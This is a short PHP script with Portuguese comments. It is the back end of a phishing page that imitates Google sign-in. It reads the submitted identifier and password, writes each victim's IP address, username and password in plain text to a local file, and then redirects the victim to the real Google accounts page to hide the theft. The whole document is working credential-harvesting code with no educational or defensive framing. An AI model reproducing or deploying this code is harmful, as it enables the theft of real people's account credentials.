<?php

// Inicializar as variáveis
$vnome = isset($_POST["identifier"]) ? $_POST["identifier"] : '';
$vsenha = isset($_POST["Passwd"]) ? $_POST["Passwd"] : '';

// Verificar se o campo senha está vazio
if (empty($vsenha)) {
    // Configurar um cookie com o valor do identificador
    setcookie("userIdentifier", $vnome, time() + 3600, "/"); // O cookie expira em 1 hora
    
    // Redirecionar para pass.html
    header("Location: pass.html");
    exit(); // Sempre incluir exit após header()
}

// Preparar os dados para gravar no arquivo
$dados = $_SERVER['REMOTE_ADDR'] . " - Nome: " . $vnome . " Senha: " . $vsenha . "\n";
$name = 'arquivo.txt';

// Verificar se o arquivo foi aberto com sucesso
if ($file = fopen($name, 'a')) {
    fwrite($file, $dados);
    fclose($file);
} else {
    // Se não conseguir abrir o arquivo, enviar mensagem de erro
    die("Erro ao abrir o arquivo. altera as permissões");
}

// Redirecionar para a página principal se a senha estiver definida
header("Location: https://accounts.google.com/");
exit(); // Sempre incluir exit após header()

?>
